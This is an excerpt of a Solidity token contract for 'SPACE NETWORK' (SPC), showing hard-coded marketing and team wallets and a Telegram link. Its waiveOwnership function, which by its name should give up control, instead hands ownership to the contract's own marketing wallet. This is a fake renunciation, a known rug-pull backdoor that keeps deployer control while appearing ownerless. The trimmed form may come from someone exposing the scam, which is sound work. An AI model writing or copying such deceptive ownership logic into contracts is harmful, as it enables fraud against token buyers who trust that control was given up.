...
// Telegram https://t.me/spacenetworkcoin
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x773652e8a0Ff6Fc6A65f89b16aEA90eeBAD1AC36);
    }
...
contract SPACENETWORK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SPACE NETWORK";
    string private _symbol = "SPC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x773652e8a0Ff6Fc6A65f89b16aEA90eeBAD1AC36);
    address payable public teamWalletAddress = payable(0x4e3C1840ffAa8291c75D3aC70ef55215Ce76693E);
